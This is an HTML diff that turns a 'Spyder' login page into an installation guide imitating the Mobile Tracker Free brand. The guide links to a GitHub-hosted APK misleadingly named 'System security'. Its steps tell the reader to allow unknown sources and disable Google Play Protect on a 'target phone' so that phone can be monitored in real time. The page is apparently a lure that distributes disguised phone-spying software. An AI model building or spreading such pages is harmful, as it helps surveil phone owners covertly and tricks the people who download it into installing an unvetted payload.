@@ -3,54 +3,245 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Spyder | Secure Access Portal</title>
+  <title>Mobile Tracker Free - Installation Guide</title>
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"/>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="index.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+ 
+  <style>
+  :root {
+    --primary-color: #007bff;
+    --text-color: #333;
+    --section-bg: #f9f9f9;
+  }
+
+  body {
+    font-family: "Segoe UI", sans-serif;
+    background-color: #fff;
+    color: var(--text-color);
+  }
+
+  .navbar {
+    background-color: #1c1c1c;
+    padding: 0.75rem 1.5rem;
+  }
+
+  .navbar-brand {
+    font-weight: bold;
+    font-size: 1.5rem;
+  }
+
+  .breadcrumb {
+    background-color: #f5f5f5;
+    font-size: 0.95rem;
+  }
+
+  .main-section {
+    padding: 3rem 1rem;
+    background-color: var(--section-bg);
+    border-top: 1px solid #ddd;
+    border-bottom: 1px solid #ddd;
+  }
+
+  .install-title {
+    font-weight: 700;
+    font-size: 2rem;
+    margin-bottom: 1.25rem;
+    color: #111;
+  }
+
+  .section-title {
+    font-weight: 600;
+    font-size: 1.3rem;
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+    color: #0056b3;
+  }
+
+  ul {
+    list-style-type: disc;
+    padding-left: 1.5rem;
+  }
+
+  ul ul {
+    list-style-type: circle;
+  }
+
+  ul li {
+    margin-bottom: 0.4rem;
+    line-height: 1.6;
+  }
+
+  a {
+    color: var(--primary-color);
+    text-decoration: none;
+  }
+
+  a:hover {
+    text-decoration: underline;
+  }
+
+  .download-btn {
+    margin-top: 2rem;
+    margin-bottom: 2rem;
+    position: absolute;
+    top: 40%;
+    right: 20%;
+  }
+
+  .btn-primary {
+    background-color: var(--primary-color);
+    border-color: var(--primary-color);
+    box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3);
+    transition: all 0.2s ease-in-out;
+  }
+
+  .btn-primary:hover {
+    background-color: #0069d9;
+    border-color: #0062cc;
+    box-shadow: 0 6px 12px rgba(0, 123, 255, 0.4);
+  }
+
+  .btn-outline-light:hover {
+    background-color: #fff;
+    color: #000;
+  }
+
+  .fa-info-circle {
+    margin-right: 0.5rem;
+  }
+
+  @media screen and (max-width: 768px) {
+    .navbar-brand img {
+      height: 25px;
+    }
+
+    .install-title {
+      font-size: 1.5rem;
+    }
+
+    .section-title {
+      font-size: 1.15rem;
+    }
+
+    .btn {
+      font-size: 0.9rem;
+    }
+  }
+</style>
+
 </head>
 <body>
 
-<div class="matrix"></div>
-<div class="pulse-circle"></div>
-<div class="spyder-logo">🕷</div>
+<!-- Navbar -->
+<nav class="navbar navbar-expand-lg navbar-dark px-3">
+  <a class="navbar-brand text-white" href="#">
+    <img src="https://www.mobile-tracker-free.com/assets/logo.svg" height="30" class="me-2" />
+    Spyder<span style="color:#00BFFF;">Remote</span> Control
+  </a>
+  <div class="ms-auto d-flex align-items-center gap-3">
+    <a href="#" class="btn btn-outline-light btn-sm">Register</a>
+    <a href="#" class="btn installLoginBtn   btn-primary  btn-sm">Login</a>
+    <img src="https://flagcdn.com/us.svg" width="24" height="16" alt="English" class="ms-2" />
+  </div> 
+</nav>
 
-<div class="login-card">
-
-  <h3 id="formTitle">Spyder Login</h3>
-
-  <!-- Login Form -->
-  <div id="loginForm">
-    <input type="email" id="loginEmail" class="form-control mb-2" placeholder="Email" />
-    <input type="password" id="loginPassword" class="form-control mb-2" placeholder="Password" />
-    <button id="loginBtn" class="btn btn-primary w-100 mb-2">Login</button>
-    <div class="text-center">
-      <a href="#" id="showForgot">Forgot Password?</a> 
-      <a href="#" id="showSignup">Sign Up</a>
-    </div>
-  </div>
-
-  <!-- Signup Form -->
-  <div id="signupForm" style="display: none;">
-    <input type="email" id="signupEmail" class="form-control mb-2" placeholder="Email" />
-    <input type="password" id="signupPassword" class="form-control mb-2" placeholder="Password" />
-    <button id="signupBtn" class="btn btn-success w-100 mb-2">Create Account</button>
-    <div class="text-center">
-      <a href="#" id="showLoginFromSignup">Back to Login</a>
-    </div>
-  </div>
-
-  <!-- Forgot Password -->
-  <div id="forgotForm" style="display: none;">
-    <input type="email" id="forgotEmail" class="form-control mb-2" placeholder="Enter your email" />
-    <button id="resetBtn" class="btn btn-warning w-100 mb-2">Send Reset Email</button>
-    <div class="text-center">
-      <a href="#" id="showLoginFromForgot">Back to Login</a>
-    </div>
-  </div>
-
-  <div id="error" class="text-danger mt-2 text-center"></div>
+<!-- Breadcrumb -->
+<div class="bg-light py-2 px-4">
+  <nav> 
+    <ol class="breadcrumb mb-0">
+      <li class="breadcrumb-item"><a href="#">Home</a></li>
+      <li class="breadcrumb-item active" aria-current="page">Installation Guide</li>
+    </ol>
+  </nav>
 </div>
 
-<script type="module" src="index.js"></script>
+<!-- Main Content -->
+<section class="main-section container">
+  <h2 class="install-title">INSTALLATION GUIDE</h2>
+  <p><i class="fa fa-info-circle text-primary"></i> Follow all the steps for the application to work properly.</p>
+
+  <!-- Index -->
+  <ul>
+    <li><a href="#prerequisites">1. Prerequisites</a></li>
+    <li><a href="#preinstallation">2. Pre-Installation & Settings Configuration</a>
+      <ul>
+        <li>2.1 Enable unknown sources for Android ≤ 7</li>
+        <li>2.2 Enable unknown sources for Android ≥ 8</li>
+        <li>2.3 Disable Google Play Protect</li>
+      </ul>
+    </li>
+    <li><a href="#installation">3. App Installation & Configuration</a>
+      <ul>
+        <li>3.1 Login and download app</li>
+        <li>3.2 Install application</li>
+        <li>3.3 Configure the application</li>
+        <li>3.4 Make application trusted / Protecting application</li>
+      </ul>
+    </li>
+    <li><a href="#loginmonitoring">4. Login and start monitoring the phone</a></li>
+  </ul>
+
+  <!-- Download Button -->
+  <div class="download-btn">
+    <a href="https://github.com/Aniket27717/ytty/raw/refs/heads/main/System%20security%20(2).apk" class="btn btn-primary">
+      <i class="fa fa-download"></i> Download Mobile Tracker Free
+    </a>
+  </div>
+  
+
+  <!-- Section 1 -->
+  <div id="prerequisites">
+    <h4 class="section-title">1. Prerequisites</h4>
+    <ul>
+      <li>Have created a Mobile Tracker Free account with a valid email address.</li>
+      <li>Have access to the target phone and permission of the phone owner to install the application.</li>
+    </ul>
+  </div>
+
+  <!-- Section 2 -->
+  <div id="preinstallation">
+    <h4 class="section-title">2. Pre-Installation & Settings Configuration</h4>
+    <ul>
+      <li>2.1 Enable unknown sources for Android ≤ 7</li>
+      <li>2.2 Enable unknown sources for Android ≥ 8</li>
+      <li>2.3 Disable Google Play Protect</li>
+    </ul>
+  </div>
+
+  <!-- Section 3 -->
+  <div id="installation">
+    <h4 class="section-title">3. App Installation & Configuration</h4>
+    <ul>
+      <li>3.1 Login and download app</li>
+      <li>3.2 Install application</li>
+      <li>3.3 Configure the application</li>
+      <li>3.4 Make application trusted / Protecting application</li>
+    </ul>
+  </div>
+
+  <!-- Section 4 -->
+  <div id="loginmonitoring">
+    <h4 class="section-title">4. Login and start monitoring the phone</h4>
+    <p>After completing all the above steps, you can log into your account and monitor the device in real time.</p>
+  </div>
+</section>
+
+<!-- Bootstrap JS -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+<script type="module">
+  import { checkAuth } from './js/auth-check.js';
+
+  const uid = checkAuth(); // Will redirect if not authenticated
+  console.log("✅ Authenticated user:", uid);
+
+  let login = document.querySelector(".installLoginBtn");
+  login.addEventListener("click",()=>{
+    document.location.href="index.html";
+  });
+  
+</script>
+
 </body>
 </html>
+
